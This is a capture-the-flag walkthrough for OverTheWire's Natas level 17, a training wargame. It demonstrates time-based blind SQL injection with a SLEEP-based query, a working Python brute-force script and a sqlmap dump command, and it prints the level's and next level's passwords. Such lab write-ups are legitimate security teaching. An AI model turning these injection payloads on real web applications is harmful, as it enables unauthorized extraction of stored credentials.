# OverTheWire Wargames

## Natas Level 16 --> Level 17

**Username:** natas17

**Password:** 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

**URL:**      http://natas17.natas.labs.overthewire.org

 
### Solution
* Click view sourcecode there you can see that there isn't any output we got back from the server, so we need to think out something else to determine the response of the select statement
* We can use 'SLEEP(n)' to determine from the response time whether entered character exists in the password or not, using this query (Time-based attacks):
```
 SELECT * from users where username="natas18" AND password LIKE BINARY '{char}%' AND SLEEP(5) --
```
* Notice that the condition after 'AND' execute only if the previous condition returns TRUE, so if the password condition return true the response should be delayed by 5sec
* We can implement this approach in two ways:
##### Python Script
* To perform brute-force to retrieve the password using Time-based attack use this python script:
```py
  import requests, string

  chars = string.ascii_uppercase + string.ascii_lowercase + '0123456789'
  base_url = 'http://natas17.natas.labs.overthewire.org/index.php?username='
  password = ''

  newChars = []
  for char in chars:
      r = requests.get(base_url+f'natas18%22+AND+password+LIKE+BINARY+%22%25{char}%25%22+AND+SLEEP%285%29+%23', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
      if r.elapsed.total_seconds() >= 5:
          newChars.append(char)

  chars = ''.join(newChars)
  print('Characters used in password: ' + chars)            

  for i in range(32):
      cnt = 0
      while True:
          payload = password + chars[cnt]
          r = requests.get(base_url+f'natas18%22+AND+password+LIKE+BINARY+%22{payload}%25%22+AND+SLEEP%285%29+%23', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
          cnt += 1

          if r.elapsed.total_seconds() >= 5:
              password = payload
              print(password, end = '\r')
              break
```

##### Sqlmap
* Use this command to retreive the password using sqlmap *(Database name and columns name can be found in the sourcecode)*
```sh
  sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --auth-type=Basic --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw --data="username=natas18" --level=3 --risk=1 --technique=T --threads=4 --dbms=MySQL -D natas17 -T users -C username,password --dump --batch
```
* Here is an explaination of each flag:
> -u              URL
> 
> --auth-type     HTTP authentication
> 
> --auth-cred     HTTP authentication credentials (name:password)
> 
> --data          Data string to be sent
> 
> --level         Number of checks to be performed.  (Range is 1 to 5. Default is 1.)
> 
> --risk          Types of payloads to use. Higher numbers could cause problems for the server. (Range is 1 to 3.  Default is 1.)
> 
> --technique     T is for Time-based attacks
> 
> --threads       Max number of concurrent HTTP(s) requests
> 
> --dbms          DataBase Management System 
> 
> -D              Database name 
>        
> -T              Table name
> 
> -C              Column name(s)
> 
> --dump          Dump DBMS database table entries
> 
> --batch         Never ask for user input, use the default behaviour

* You got the password!!

### Natas18 Password
> xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
